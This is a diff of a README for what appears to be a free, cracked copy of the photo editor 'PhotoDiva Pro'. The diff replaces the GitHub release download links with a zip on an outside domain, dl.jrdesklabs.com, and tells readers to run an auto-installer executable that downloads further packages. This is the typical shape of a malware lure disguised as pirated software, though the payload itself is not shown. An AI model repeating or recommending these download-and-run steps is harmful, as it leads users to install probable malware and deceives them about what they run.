@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/c04a712f-8333-4441-b90f-59d1d38a5d34)
-](https://github.com/AdetonaMichael/PhotoDiva-Pro-free-2024/releases/download/V4.2/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/AdetonaMichael/PhotoDiva-Pro-free-2024/releases/download/V4.2/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_14-23-02](https://github.com/user-attachments/assets/7b7c375c-968a-4253-b2e8-6fe274f3319d)
